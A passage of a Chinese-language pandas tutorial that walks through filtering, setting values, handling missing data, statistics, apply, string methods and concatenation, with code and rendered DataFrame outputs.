th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>False</td>      <td>True</td>      <td>True</td>      <td>True</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>False</td>      <td>True</td>      <td>False</td>      <td>True</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>False</td>      <td>True</td>      <td>True</td>      <td>False</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>False</td>      <td>True</td>      <td>False</td>      <td>True</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>False</td>      <td>True</td>      <td>True</td>      <td>False</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>False</td>      <td>True</td>      <td>False</td>      <td>False</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df<span class="token punctuation">[</span>df <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>NaN</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>NaN</td>      <td>0.564346</td>      <td>NaN</td>      <td>0.080931</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>NaN</td>      <td>2.046827</td>      <td>1.176614</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>NaN</td>      <td>1.109991</td>      <td>NaN</td>      <td>1.068642</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>NaN</td>      <td>1.351420</td>      <td>0.907865</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>NaN</td>      <td>0.027143</td>      <td>NaN</td>      <td>NaN</td>    </tr>  </tbody></table></div><p>使用 <code>isin()</code> 方法来过滤数据</p><p>(is in)</p><pre class=" language-python"><code class="language-python">df3 <span class="token operator">=</span> df<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>df3<span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'one'</span><span class="token punctuation">,</span><span class="token string">'two'</span><span class="token punctuation">,</span><span class="token string">'three'</span><span class="token punctuation">,</span><span class="token string">'four'</span><span class="token punctuation">,</span><span class="token string">'three'</span><span class="token punctuation">]</span>df3</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>-0.228084</td>      <td>0.712521</td>      <td>0.743378</td>      <td>0.526823</td>      <td>one</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>0.080931</td>      <td>one</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>      <td>two</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>1.068642</td>      <td>three</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>      <td>four</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>-0.333819</td>      <td>three</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df3<span class="token punctuation">[</span>df3<span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isin<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'two'</span><span class="token punctuation">,</span><span class="token string">'four'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>-0.365556</td>      <td>two</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>-1.074013</td>      <td>four</td>    </tr>  </tbody></table></div><h2 id="0x05-设置数据-Setting"><a href="#0x05-设置数据-Setting" class="headerlink" title="0x05 设置数据 Setting"></a>0x05 设置数据 Setting</h2><p>设置一个新的列，自动按照索引来对其数据</p><pre class=" language-python"><code class="language-python">s1 <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> index<span class="token operator">=</span>pd<span class="token punctuation">.</span>date_range<span class="token punctuation">(</span><span class="token string">'20200416'</span><span class="token punctuation">,</span> periods<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s1</code></pre><pre><code>2020-04-16    12020-04-17    22020-04-18    32020-04-19    42020-04-20    52020-04-21    6Freq: D, dtype: int64</code></pre><pre class=" language-python"><code class="language-python">df<span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span> <span class="token operator">=</span> s1</code></pre><p>通过标签设置新的值</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>at<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span></code></pre><p>通过标签设置新的值</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>iat<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span></code></pre><p>通过一个 numpy 数组设置一组新值</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">*</span> len<span class="token punctuation">(</span>df<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>上述操作结果如下</p><pre class=" language-python"><code class="language-python">df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5</td>      <td>1</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>5</td>      <td>2</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>5</td>      <td>3</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>5</td>      <td>4</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>1.351420</td>      <td>0.907865</td>      <td>5</td>      <td>5</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>0.027143</td>      <td>-0.420875</td>      <td>5</td>      <td>6</td>    </tr>  </tbody></table></div><p>通过 where 操作来设置新的值</p><pre class=" language-python"><code class="language-python">df2 <span class="token operator">=</span> df<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>df2<span class="token punctuation">[</span>df2 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>df2df2</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>-0.743378</td>      <td>-5</td>      <td>-1</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>-0.564346</td>      <td>-2.318931</td>      <td>-5</td>      <td>-2</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>-2.046827</td>      <td>-1.176614</td>      <td>-5</td>      <td>-3</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>-1.109991</td>      <td>-1.527804</td>      <td>-5</td>      <td>-4</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>-1.351420</td>      <td>-0.907865</td>      <td>-5</td>      <td>-5</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>-0.027143</td>      <td>-0.420875</td>      <td>-5</td>      <td>-6</td>    </tr>  </tbody></table></div><h2 id="0x06-缺失值处理-Missing-Data"><a href="#0x06-缺失值处理-Missing-Data" class="headerlink" title="0x06 缺失值处理 Missing Data"></a>0x06 缺失值处理 Missing Data</h2><p>在pandas中，使用<code>np.nan</code>来代替缺失值，这些值将默认不会包含在计算中。</p><p><code>reindex()</code>方法可以对指定轴上的索引进行改变/增加/删除操作，返回原始数据的一个拷贝。</p><pre class=" language-python"><code class="language-python">df1 <span class="token operator">=</span> df<span class="token punctuation">.</span>reindex<span class="token punctuation">(</span>index<span class="token operator">=</span>dates<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> columns<span class="token operator">=</span>list<span class="token punctuation">(</span>df<span class="token punctuation">.</span>columns<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df1</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5</td>      <td>1</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>5</td>      <td>2</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>5</td>      <td>3</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>5</td>      <td>4</td>      <td>NaN</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df1<span class="token punctuation">.</span>loc<span class="token punctuation">[</span>dates<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>dates<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>df1</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5</td>      <td>1</td>      <td>1.0</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>5</td>      <td>2</td>      <td>1.0</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>5</td>      <td>3</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>5</td>      <td>4</td>      <td>NaN</td>    </tr>  </tbody></table></div><p>去掉包含缺失值的行</p><pre class=" language-python"><code class="language-python">df1<span class="token punctuation">.</span>dropna<span class="token punctuation">(</span>how<span class="token operator">=</span><span class="token string">'any'</span><span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5</td>      <td>1</td>      <td>1.0</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>5</td>      <td>2</td>      <td>1.0</td>    </tr>  </tbody></table></div><p>填充缺失的值，利用<code>value</code>来指定</p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">)</span>df1<span class="token punctuation">.</span>fillna<span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span></code></pre><pre><code>                   A         B         C  D  F    E2020-04-16  0.000000  0.000000  0.743378  5  1  1.02020-04-17 -0.423923  0.564346 -2.318931  5  2  1.02020-04-18 -2.032243  2.046827  1.176614  5  3  NaN2020-04-19 -1.200005  1.109991 -1.527804  5  4  NaN</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5</td>      <td>1</td>      <td>1.0</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-2.318931</td>      <td>5</td>      <td>2</td>      <td>1.0</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>2.046827</td>      <td>1.176614</td>      <td>5</td>      <td>3</td>      <td>5.0</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>1.109991</td>      <td>-1.527804</td>      <td>5</td>      <td>4</td>      <td>5.0</td>    </tr>  </tbody></table></div><p>获取值为<code>nan</code>的布尔值(boolean mask)</p><pre class=" language-python"><code class="language-python">pd<span class="token punctuation">.</span>isna<span class="token punctuation">(</span>df1<span class="token punctuation">)</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>      <th>E</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>True</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>False</td>      <td>True</td>    </tr>  </tbody></table></div><h2 id="0x07-一些常用的操作-Operations"><a href="#0x07-一些常用的操作-Operations" class="headerlink" title="0x07 一些常用的操作 Operations"></a>0x07 一些常用的操作 Operations</h2><h3 id="0x07-1-统计-Stats"><a href="#0x07-1-统计-Stats" class="headerlink" title="0x07-1 统计 Stats"></a>0x07-1 统计 Stats</h3><p>这些操作<strong>不包括缺失数据</strong></p><p>执行描述性统计：</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 均值，默认为列的</span></code></pre><pre><code>A   -0.800989B    0.849955C   -0.239959D    5.000000F    3.500000dtype: float64</code></pre><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 指定坐标轴（此处为行）</span></code></pre><pre><code>2020-04-16    1.3486762020-04-17    0.9642992020-04-18    1.8382402020-04-19    1.4764362020-04-20    2.3448512020-04-21    1.998307Freq: D, dtype: float64</code></pre><p>对于拥有不同维度，需要对齐对象再进行操作。</p><p>Pandas 会自动的沿着指定的维度进行广播。</p><pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span>np<span class="token punctuation">.</span>nan<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> index<span class="token operator">=</span>dates<span class="token punctuation">)</span><span class="token punctuation">.</span>shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>s</code></pre><pre><code>2020-04-16    NaN2020-04-17    NaN2020-04-18    1.02020-04-19    3.02020-04-20    5.02020-04-21    NaNFreq: D, dtype: float64</code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span>df<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>s<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token string">'index'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># df-s</span></code></pre><pre><code>                   A         B         C  D  F2020-04-16  0.000000  0.000000  0.743378  5  12020-04-17 -0.423923  0.564346 -2.318931  5  22020-04-18 -2.032243  2.046827  1.176614  5  32020-04-19 -1.200005  1.109991 -1.527804  5  42020-04-20 -0.535031  1.351420  0.907865  5  52020-04-21 -0.614734  0.027143 -0.420875  5  6</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-3.032243</td>      <td>1.046827</td>      <td>0.176614</td>      <td>4.0</td>      <td>2.0</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-4.200005</td>      <td>-1.890009</td>      <td>-4.527804</td>      <td>2.0</td>      <td>1.0</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-5.535031</td>      <td>-3.648580</td>      <td>-4.092135</td>      <td>0.0</td>      <td>0.0</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>    </tr>  </tbody></table></div><h3 id="0x07-2-应用方法到数据-Apply"><a href="#0x07-2-应用方法到数据-Apply" class="headerlink" title="0x07-2 应用方法到数据 Apply"></a>0x07-2 应用方法到数据 Apply</h3><p>Applying functions to the data</p><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>apply<span class="token punctuation">(</span>np<span class="token punctuation">.</span>cumsum<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># cumsum 默认按照行累加</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5</td>      <td>1</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.564346</td>      <td>-1.575552</td>      <td>10</td>      <td>3</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.456166</td>      <td>2.611174</td>      <td>-0.398938</td>      <td>15</td>      <td>6</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-3.656170</td>      <td>3.721165</td>      <td>-1.926743</td>      <td>20</td>      <td>10</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-4.191201</td>      <td>5.072585</td>      <td>-1.018877</td>      <td>25</td>      <td>15</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-4.805935</td>      <td>5.099728</td>      <td>-1.439752</td>      <td>30</td>      <td>21</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>apply<span class="token punctuation">(</span>np<span class="token punctuation">.</span>cumsum<span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 指定 cumsum 的 axis 参数，按照列累加</span></code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>A</th>      <th>B</th>      <th>C</th>      <th>D</th>      <th>F</th>    </tr>  </thead>  <tbody>    <tr>      <th>2020-04-16</th>      <td>0.000000</td>      <td>0.000000</td>      <td>0.743378</td>      <td>5.743378</td>      <td>6.743378</td>    </tr>    <tr>      <th>2020-04-17</th>      <td>-0.423923</td>      <td>0.140424</td>      <td>-2.178507</td>      <td>2.821493</td>      <td>4.821493</td>    </tr>    <tr>      <th>2020-04-18</th>      <td>-2.032243</td>      <td>0.014584</td>      <td>1.191198</td>      <td>6.191198</td>      <td>9.191198</td>    </tr>    <tr>      <th>2020-04-19</th>      <td>-1.200005</td>      <td>-0.090013</td>      <td>-1.617818</td>      <td>3.382182</td>      <td>7.382182</td>    </tr>    <tr>      <th>2020-04-20</th>      <td>-0.535031</td>      <td>0.816389</td>      <td>1.724255</td>      <td>6.724255</td>      <td>11.724255</td>    </tr>    <tr>      <th>2020-04-21</th>      <td>-0.614734</td>      <td>-0.587591</td>      <td>-1.008466</td>      <td>3.991534</td>      <td>9.991534</td>    </tr>  </tbody></table></div><pre class=" language-python"><code class="language-python">df<span class="token punctuation">.</span>apply<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>max<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> x<span class="token punctuation">.</span>min<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><pre><code>A    2.032243B    2.046827C    3.495545D    0.000000F    5.000000dtype: float64</code></pre><h3 id="0x07-3-直方图-Histogramming"><a href="#0x07-3-直方图-Histogramming" class="headerlink" title="0x07-3 直方图 Histogramming"></a>0x07-3 直方图 Histogramming</h3><pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s</code></pre><pre><code>0    01    42    53    04    35    26    27    08    59    1dtype: int32</code></pre><pre class=" language-python"><code class="language-python">s<span class="token punctuation">.</span>value_counts<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>0    35    22    24    13    11    1dtype: int64</code></pre><h3 id="0x07-4-字符串方法-String-Methods"><a href="#0x07-4-字符串方法-String-Methods" class="headerlink" title="0x07-4 字符串方法 String Methods"></a>0x07-4 字符串方法 String Methods</h3><p>Series 在<code>str</code>属性中准备了一组字符串处理方法，可以方便地对数组的每个元素进行操作，如下面的代码片段所示。</p><p>注意<code>str</code>中的模式匹配通常默认使用’<strong>正则表达式</strong>（在某些情况下总是使用它们）。</p><pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'Aaba'</span><span class="token punctuation">,</span> <span class="token string">'Baca'</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>nan<span class="token punctuation">,</span> <span class="token string">'CABA'</span><span class="token punctuation">,</span> <span class="token string">'dog'</span><span class="token punctuation">,</span> <span class="token string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>str<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre><code>0       a1       b2       c3    aaba4    baca5     NaN6    caba7     dog8     catdtype: object</code></pre><h2 id="0x08-合并-Merge"><a href="#0x08-合并-Merge" class="headerlink" title="0x08 合并 Merge"></a>0x08 合并 Merge</h2><p>pandas 提供了一系列的方法，在 join/merge 操作中，可以轻松地对<code>Series</code>, <code>DataFrame</code>和<code>Panel</code>对象进行各种集合逻辑以及关系代数的操作。</p><h3 id="0x08-1-Concat"><a href="#0x08-1-Concat" class="headerlink" title="0x08-1 Concat"></a>0x08-1 Concat</h3><pre class=" language-python"><code class="language-python">df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>df</code></pre><div><style scoped="">    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style><p></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>0</th>      <th>1</th>      <th>2</th>      <th>3</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>-0.089143</td>      <td>0.087569</td>      <td>0.218078</td>      <td>-0.336815</td>    </tr>    <tr>      <th>1</th>      <td>-0.694835</td>      <td>0.108324</td>      <td>-1.882762</td>      <td>-0.220210</td>    </tr>    <tr>      <th>2</th>      <td>-2.069784</td>      <td>-0.788424</td>      <td>-1.694595</td>      <td>0.569263</td>    </tr>    <tr>      <th>3</th>      <td>2.433036</td>      <td>0.719851</td>      <td>-0.109935</td>      <td>0.177864</td>    </tr>    <tr>      <th>4</th>      